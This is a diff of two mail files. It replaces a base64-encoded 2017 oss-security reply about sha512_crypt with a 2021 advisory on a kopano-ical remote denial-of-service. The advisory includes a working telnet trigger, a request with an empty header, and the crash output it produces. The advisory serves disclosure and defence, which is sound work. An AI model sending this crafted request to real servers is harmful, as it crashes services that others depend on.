@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5609" "Monday" "18" "September" "2017" "14:00:09" "-0400" "Jordan Glover" "Golden_Miller83@protonmail.ch" "<qWCZkHrkayvHEmeBy-991q6imWh5pr0TEcjq2lfM_P8bQd-92ImpaBaS0gT0cPe6vpteJjOFXRcoHk-HW3EcP4UfxoB-30ViHwUGVQv68tY=@protonmail.ch>" "97" "Re: [oss-security] [OSSN-0081] sha512_crypt is insufficient for password hashing" "^Date:" nil nil "9" "2017091818:00:09" "[oss-security] [OSSN-0081] sha512_crypt is insufficient for password hashing" (number mark "        Golden_Mille Sep 18   97/5609  " thread-indent "\"Re: [oss-security] [OSSN-0081] sha512_crypt is insufficient for password hashing\"\n") "<20170917130410.GA8650@openwall.com>" ("<6bc72013-a061-9025-7b50-7e35f63f45f3@redhat.com>" "<20170917130410.GA8650@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["967" "Friday" "2" "April" "2021" "10:26:29" "+0200" "Jan Engelhardt" "jengelh@inai.de" nil "34" "[oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access" nil nil nil "4" nil nil (number mark "U       jengelh@inai Apr  2   34/967   " thread-indent "\"[oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 18020 invoked by uid 550); 18 Sep 2017 19:05:45 -0000
+Received: (qmail 5810 invoked by uid 550); 2 Apr 2021 10:20:27 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,122 +11,49 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 32077 invoked from network); 18 Sep 2017 18:00:30 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=protonmail.ch;
-	s=default; t=1505757618;
-	bh=rlxHVOb4NIHm1QZcOSVCJ5kj1FktCOqHMa5UWpELoTI=;
-	h=To:From:Reply-To:Subject:In-Reply-To:References:Feedback-ID:From;
-	b=kjAOlUPuv8CO5dp7UBLfJg76h9Gr0G96zehJatBIjTGWfbZdJunlKqiGJeAKG9XU9
-	 Eod4V9RKjJtnQjyPQsMcPEZwBv9s9PiTuwNeNVCeyrK3n6JkMnNWPRlxzJc8K2OijC
-	 zNgVwG8fLGvbIsonENSPDp27I5ZKb5XdTt+hZWpI=
-Message-ID: <qWCZkHrkayvHEmeBy-991q6imWh5pr0TEcjq2lfM_P8bQd-92ImpaBaS0gT0cPe6vpteJjOFXRcoHk-HW3EcP4UfxoB-30ViHwUGVQv68tY=@protonmail.ch>
-In-Reply-To: <20170917130410.GA8650@openwall.com>
-References: <6bc72013-a061-9025-7b50-7e35f63f45f3@redhat.com>
- <20170917130410.GA8650@openwall.com>
-Feedback-ID: QEdvdaLhFJaqnofhWA-dldGwsuoeDdDw7vz0UPs8r8sanA3bIt8zJdf4aDqYKSy4gJuZ0WvFYJtvq21y6ge_uQ==:Ext:ProtonMail
-MIME-Version: 1.0
-Content-Type: multipart/alternative;
-	boundary="b1_ef9ca13e1edd44fe8987aeed412009fe"
-Date: Mon, 18 Sep 2017 14:00:09 -0400
-From: Jordan Glover <Golden_Miller83@protonmail.ch>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] [OSSN-0081] sha512_crypt is insufficient for password hashing
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-
---b1_ef9ca13e1edd44fe8987aeed412009fe
+Received: (qmail 30657 invoked from network); 2 Apr 2021 08:26:41 -0000
+Date: Fri, 2 Apr 2021 10:26:29 +0200 (CEST)
+From: Jan Engelhardt <jengelh@inai.de>
+To: oss-security@lists.openwall.com
+Message-ID: <op516nqr-96s1-3r69-4np9-314p89o96951@vanv.qr>
+User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
+MIME-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: base64
+Content-Transfer-Encoding: 8BIT
+Subject: [oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access
 
-V2hhdCBudW1iZXIgb2YgaXRlcmF0aW9ucyBpcyBjb25zaWRlcmVkIHNlY3Vy
-ZSBmb3Igc2hhNTEyY3J5cHQvcGJrZGYyIHRoZXNlIGRheXM/Cgo+IC0tLS0t
-LS0tIE9yaWdpbmFsIE1lc3NhZ2UgLS0tLS0tLS0KPiBTdWJqZWN0OiBSZTog
-W29zcy1zZWN1cml0eV0gW09TU04tMDA4MV0gc2hhNTEyX2NyeXB0IGlzIGlu
-c3VmZmljaWVudCBmb3IgcGFzc3dvcmQgaGFzaGluZwo+IExvY2FsIFRpbWU6
-IFNlcHRlbWJlciAxNywgMjAxNyAxOjA0IFBNCj4gVVRDIFRpbWU6IFNlcHRl
-bWJlciAxNywgMjAxNyAxOjA0IFBNCj4gRnJvbTogc29sYXJAb3BlbndhbGwu
-Y29tCj4gVG86IG9zcy1zZWN1cml0eUBsaXN0cy5vcGVud2FsbC5jb20KPgo+
-IE9uIFN1biwgU2VwIDE3LCAyMDE3IGF0IDEyOjI3OjQxUE0gKzAxMDAsIEx1
-a2UgSGluZHMgd3JvdGU6Cj4+IEtleXN0b25lIHVzZXMgc2hhNTEyX2NyeXB0
-IGZvciBwYXNzd29yZCBoYXNoaW5nLiBUaGlzIHByb3ZpZGVzCj4+IGluc3Vm
-ZmljaWVudCBhbmQgbGltaXRlZCBwcm90ZWN0aW9uLCBzaW5jZSBzaGE1MTJf
-Y3J5cHQgYWxnb3JpdGhtIGhhcyBhCj4+IGxvdyBjb21wdXRhdGlvbmFsIGNv
-c3QgZmFjdG9yLCB0aGVyZWZvcmUgbWFraW5nIGl0IGVhc2llciB0byBjcmFj
-awo+PiBwYXNzd29yZHMgb2ZmbGluZSBpbiBhIHNob3J0IHBlcmlvZCBvZiB0
-aW1lLgo+Pgo+PiBUaGUgY29ycmVjdCBtZWNoYW5pc20gaXMgdG8gdXNlIHRo
-ZSBtb3JlIHNlY3VyZSBoYXNoaW5nIGFsZ29yaXRobXMgd2l0aAo+PiBhIGhp
-Z2hlciBjb21wdXRhdGlvbmFsIGNvc3QgZmFjdG9yIHN1Y2ggYXMgYmNyeXB0
-LCBzY3J5cHQsIG9yCj4+IHBia2RmMl9zaGE1MTIgaW5zdGVhZCBvZiBzaGE1
-MTJfY3J5cHQuCj4+Cj4+ICMjIyBSZWNvbW1lbmRlZCBBY3Rpb25zICMjIwo+
-Pgo+PiBJdCBpcyByZWNvbW1lbmRlZCB0aGF0IG9wZXJhdG9ycyB1cGdyYWRl
-IHRvIHRoZSBQaWtlIHJlbGVhc2Ugd2hlcmUgYWxsCj4+IGZ1dHVyZSBwYXNz
-d29yZHMgd291bGQgYmUgYmNyeXB0IGhhc2hlZC4KPgo+IFRoZSBtb3ZlIHRv
-IGJjcnlwdCBtYWtlcyBzZW5zZSBhcyBhIGRlZmVuc2UgYWdhaW5zdCBHUFUg
-YXR0YWNrcywgd2hpY2gKPiBhcmUgY3VycmVudGx5IG1vc3QgcmVsZXZhbnQu
-IEkgd291bGQgaGF2ZSByZWNvbW1lbmRlZCBpdCwgdG9vLgo+Cj4gSG93ZXZl
-ciwgdGhlIHdvcmRpbmcgb2YgdGhlIGFkdmlzb3J5IGFuZCBpbiB0aGUgZGlz
-Y3Vzc2lvbiBhdAo+IGh0dHBzOi8vYnVncy5sYXVuY2hwYWQubmV0L29zc24v
-K2J1Zy8xNjY4NTAzIGlzIHdlaXJkLgo+Cj4gSSBhc3N1bWUgdGhhdCBzaGE1
-MTJfY3J5cHQgcmVmZXJzIHRvIHRoZSBhbGdvcml0aG0gaW50cm9kdWNlZCBp
-biBnbGliYwo+IDIuNyBhbmQgbm93IHVzZWQgYnkgbWFueSBMaW51eCBkaXN0
-cm9zIGFuZCBtb3JlLiBJdCBpcyB0eXBpY2FsbHkgY2FsbGVkCj4gc2hhNTEy
-Y3J5cHQgd2l0aG91dCB0aGUgdW5kZXJzY29yZS4gSSBhbHNvIGFzc3VtZSB0
-aGF0IHBia2RmMl9zaGE1MTIKPiByZWZlcnMgdG8gUEJLREYyLUhNQUMtU0hB
-NTEyLgo+Cj4gc2hhNTEyY3J5cHQicyAiY29tcHV0YXRpb25hbCBjb3N0IGZh
-Y3RvciIgaXMgdHVuYWJsZSwgYW5kIHNoYTUxMmNyeXB0Cj4gaXNuInQgcXVp
-Y2tlciB0byBjcmFjayB0aGFuIFBCS0RGMi1ITUFDLVNIQTUxMiB3aGVuIGJv
-dGggYXJlIHR1bmVkIGZvcgo+IHRoZSBzYW1lIGRlZmVuc2l2ZSBydW5uaW5n
-IHRpbWUgYW5kIHVzZSBpbXBsZW1lbnRhdGlvbnMgb3B0aW1pemVkIHRvIGEK
-PiBzaW1pbGFyIGV4dGVudC4gSG93ZXZlciwgUEJLREYyLUhNQUMgaGFzIHdv
-cnNlIG1pc3NlZCBvcHRpbWl6YXRpb24KPiBwaXRmYWxscywgc28gaGlnaGx5
-IHVub3B0aW1hbCBpbXBsZW1lbnRhdGlvbnMgb2YgUEJLREYyIGFyZSB2ZXJ5
-IGNvbW1vbjoKPgo+IGh0dHBzOi8vamJwLmlvLzIwMTUvMDgvMTEvcGJrZGYy
-LXBlcmZvcm1hbmNlLW1hdHRlcnMKPgo+IE9idmlvdXNseSwgcGFzc3dvcmQg
-Y3JhY2tlcnMgbWF5IHVzZSBtb3JlIG9wdGltYWwgaW1wbGVtZW50YXRpb25z
-Lgo+Cj4gSSBndWVzcyB0aGUgbmFtZXMgd2l0aCB1bmRlcnNjb3JlcyBhcmUg
-c29tZSBzcGVjaWZpYyBpbnN0YW50aWF0aW9ucyB3aXRoCj4gZml4ZWQgY29z
-dCBmYWN0b3JzPyBJIGd1ZXNzIGJjcnlwdCBhbmQgc2NyeXB0IHJlZmVycmVk
-IHRvIGhlcmUgYXJlIGFsc28KPiBzcGVjaWZpYyBpbnN0YW50aWF0aW9ucyB3
-aXRoIGZpeGVkIGNvc3QgZmFjdG9ycz8gVGhlbiB0aGUgd29yZGluZyB3b3Vs
-ZAo+IHN0YXJ0IHRvIG1ha2Ugc2Vuc2UuIEZvciBjb21wbGV0ZW5lc3MsIHdo
-YXQgYXJlIHRoZSBzcGVjaWZpYyBjb3N0Cj4gZmFjdG9ycyB1c2VkIGZvciBl
-YWNoIG9mIHRob3NlIGZvdXI/Cj4KPiBSZWFkaW5nIHRoZSBkaXNjdXNzaW9u
-IG9uIHJlbGV2YW50IEJ1ZyBlbnRyaWVzIGFuZCBwcm9wb3NlZCBjb21taXRz
-LCBpdAo+IGFwcGVhcnMgdGhhdCBwYmtkZjJfc2hhNTEyIHdhcyByZWNlbnRs
-eSBpbnRyb2R1Y2VkIHVuZGVyIHRoZSBmbGF3ZWQKPiB1bmRlcnN0YW5kaW5n
-IHRoYXQgInNoYTUxMl9jcnlwdCBpcyBjb25zaWRlcmVkIGluc3VmZmljaWVu
-dCAoZXZlbiB3aXRoCj4gc2lnbmlmaWNhbnQgcm91bmRzKSBpbiBjb21wYXJp
-c29uIHRvIHBka2ZkX3NoYTUxMiwgYmNyeXB0LCBvciBzY3J5cHQgZm9yCj4g
-cGFzc3dvcmQgaGFzaGluZy4iIFdoaWxlIHRoZSByZWZlcmVuY2VzIHRvIGJj
-cnlwdCBhbmQgc2NyeXB0IGFyZQo+IGNvcnJlY3QsIHRoZSByZWZlcmVuY2Ug
-dG8gKHByZXN1bWFibHkpIFBCS0RGMi1ITUFDLVNIQTUxMiBpcyB3cm9uZy4g
-SXQKPiBpcyBpbiB0aGUgc2FtZSBjYXRlZ29yeSB3aXRoIHNoYTUxMmNyeXB0
-LiBBcyBpdCBpcywgcGJrZGYyX3NoYTUxMiBtaWdodAo+IHZlcnkgd2VsbCBh
-bGxvdyBmb3IgcXVpY2tlciBjcmFja2luZyB0aGFuIHNoYTUxMl9jcnlwdCBk
-b2VzLiBXaXRob3V0Cj4ga25vd2luZyB0aGUgc3BlY2lmaWMgc2V0dGluZ3Mg
-YW5kIGVmZmljaWVuY3kgb2YgaW1wbGVtZW50YXRpb25zLCB3ZQo+IGNhbiJ0
-IHRlbGwuCj4KPiBUaGVuLCBCdWcgMTY2ODUwMyBsaXN0cyBGUEdBcyBhcyBw
-YXJ0IG9mIHRoZSBtb3RpdmF0aW9uIGZvciB0aGUgY2hhbmdlLgo+IEhvd2V2
-ZXIsIGJjcnlwdCBmaXRzIEZQR0FzIHZlcnkgd2VsbDoKPgo+IGh0dHA6Ly93
-d3cub3BlbndhbGwuY29tL2xpc3RzL2pvaG4tdXNlcnMvMjAxNy8wNi8yNS8x
-Cj4gaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvam9obi11c2Vycy8y
-MDE3LzA3LzAzLzQKPgo+IFRoZSBtb3ZlIGZyb20gc2hhNTEyY3J5cHQgdG8g
-YmNyeXB0IGlzIGdvb2QgYWdhaW5zdCBHUFVzLCBidXQgbWFrZXMKPiBsaXR0
-bGUgZGlmZmVyZW5jZSBhZ2FpbnN0IEZQR0FzLiBJdCJzIHN0aWxsIGEgZmlu
-ZSBtb3ZlIHRvIHRha2Ugbm93IC0KPiBpdCBpcyBhbiBpbXByb3ZlbWVudCwg
-YW5kIEdQVSBhdHRhY2tzIGFyZSBtb3JlIHJlbGV2YW50LiBZb3UganVzdCBu
-ZWVkCj4gdG8ga25vdyB3aGF0IHlvdSBhY2hpZXZlIChHUFUgYXR0YWNrIHJl
-c2lzdGFuY2UpIGFuZCB3aGF0IHlvdSBkb24idAo+IGFjaGlldmUgKEZQR0Eg
-YXR0YWNrIHJlc2lzdGFuY2UpLgo+Cj4gT2YgdGhlIGZvdXIgYWxnb3JpdGht
-cywgb25seSBzY3J5cHQgKGFuZCBvbmx5IGF0IGhpZ2ggZW5vdWdoIHNldHRp
-bmdzKQo+IGlzIHNvbWV3aGF0IEZQR0EgYXR0YWNrIHJlc2lzdGFudCBieSBy
-ZXF1aXJpbmcgZXh0ZXJuYWwgbWVtb3J5IGFuZAo+IG1lbW9yeSBiYW5kd2lk
-dGgsIHdoaWNoIGhhcyB0byBiZSBwYXJ0IG9mIHRoZSBhdHRhY2sgcGxhdGZv
-cm0icyBjb3N0Lgo+Cj4gSSBkb24idCByZWNvbW1lbmQgYW55IGZ1cnRoZXIg
-Y29kZSBjaGFuZ2VzIGF0IHRoaXMgdGltZS4gUmF0aGVyLCBJCj4gcmVjb21t
-ZW5kIHRoYXQgdGhlIGNvbmZ1c2lvbiBiZSBkZWFsdCB3aXRoOiBjbGFyaWZ5
-IHRoZSBzZXR0aW5ncyB1c2VkLAo+IGRvbiJ0IHJlZmVyIHRvIHBia2RmMl9z
-aGE1MTIgYXMgYSBjbGVhciBpbXByb3ZlbWVudCB1cG9uIHNoYTUxMl9jcnlw
-dC4KPgo+IEFsZXhhbmRlcg==
+Initial publication, no CVE number yet.
 
---b1_ef9ca13e1edd44fe8987aeed412009fe--
+# Affected versions
 
+  * kopano-core 11.0.1
+  * kopano-core 8.7.20
+  * it is believed this affects all other versions too,
+    including 10.0.7, 9.1.0, and zarafa 7.2.6.
+
+The "kopano-ical" program implements a network service/trivial HTTP 
+server. It fails to properly check HTTP headers, and with a crafted 
+request, can be exploited to drive the process into an exception and 
+have it terminate.
+
+
+# Trigger
+
+» ./kopano-ical -F &
+» telnet localhost 8000
+Trying ::1...
+Connected to localhost.
+Escape character is '^]'.
+GET / HTTP/1.0
+Foo:
+Connection closed by foreign host.
+terminate called after throwing an instance of 'std::out_of_range'
+  what():  basic_string::substr: __pos (which is 6) > this->size() (which is 5)
+
+
+# Mitigation
+
+In conjunction with a proxy, the issue does not occur as they often 
+filter lines (LF->CRLF, giving an extra byte). Tested ones: 
+nginx-1.19.8 squid-4.14 apache2-2.4.46 tinyproxy-1.10.0
